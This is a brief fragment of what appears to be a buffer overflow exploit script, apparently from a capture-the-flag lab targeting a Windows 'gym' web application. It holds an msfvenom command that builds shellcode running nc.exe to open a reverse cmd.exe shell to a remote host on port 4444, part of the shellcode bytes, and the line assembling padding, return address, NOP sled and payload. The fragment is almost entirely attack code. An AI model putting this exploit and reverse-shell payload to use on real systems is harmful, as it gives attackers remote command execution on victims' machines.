...
#msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.1000 4444' -b '\x00\x0a\x0d' -f py -v payload
payload =  b""
...
payload += b"\x0e\x64\x68\x02\x00\x21\xfc\x89\xe6\x6a\x10\x56"
...
bu1 = padding1 + EIP + NOPS + payload + overrun 
